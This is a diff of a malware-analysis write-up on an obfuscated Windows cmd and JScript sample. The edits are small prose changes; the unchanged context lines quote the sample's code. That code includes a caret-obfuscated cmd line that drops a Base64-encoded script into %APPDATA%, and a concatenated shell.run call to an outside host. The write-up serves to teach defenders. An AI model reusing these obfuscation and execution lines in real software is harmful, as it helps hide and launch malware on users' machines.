@@ -10,9 +10,9 @@ start /MIN cmd %ComSpec% /V/D/c "s^eT IITV=%APPDATA%\%RANDOM%.^j^S&&echo dmFyIEN
 
 While certutil is used to manage certificates, the tool can be abused by attackers in quite a few ways including downloading files, and also encoding and decoding files in Base64[^1]. This technique to use native system tools is referred to as Living off the Land[^2]. 
 
-3. The initial cmd file utilises windows environment variables[^3], as well as setting a new variable to an encoded Base64 file. I've added a few additional windows environment variables which were not included in the original sample such as the %RANDOM% environment variable when creating the file.
+3. The initial cmd file utilises windows environment variables[^3], as well as setting a new variable to an encoded Base64 file. I've added a few additional Windows environment variables which were not included in the original sample such as the %RANDOM% environment variable when creating the file.
 
-4. The initial cmd also heavily uses an obfuscation technique of uninterpreted escape characters[^1][^3], in this case ^. While a simple technique, it can be highly effective. I've added the direct use of WScript and also utilised the same obfuscation technique to this command. See reference section for more details.
+4. The initial cmd also heavily uses an obfuscation technique of uninterpreted escape characters[^1][^3], in this case ^. While a simple technique, it can be highly effective. I've added the direct use of WScript and also utilised the same obfuscation technique to this command. 
 
 5. Decode the Base64. Example, using online tool Base64 Guru [^4].
 
@@ -36,7 +36,7 @@ shell.run(FSaJ + GSaJ + "attackndefend.com");
 
 The first type of obfuscation is called string concatenation[^1], where parts of a string are separated and combined using a concatenation operator, such as the "+" symbol in this example.
 
-The second type of obfuscation is called variable substitution[^3], where commands or strings are broken up and assigned to variables to make them less recognizable to human readers.
+The second type of obfuscation is called variable string substitution[^3], where commands or strings are broken up and assigned to variables to make them less recognizable to human readers.
 
 7. Script execution
 
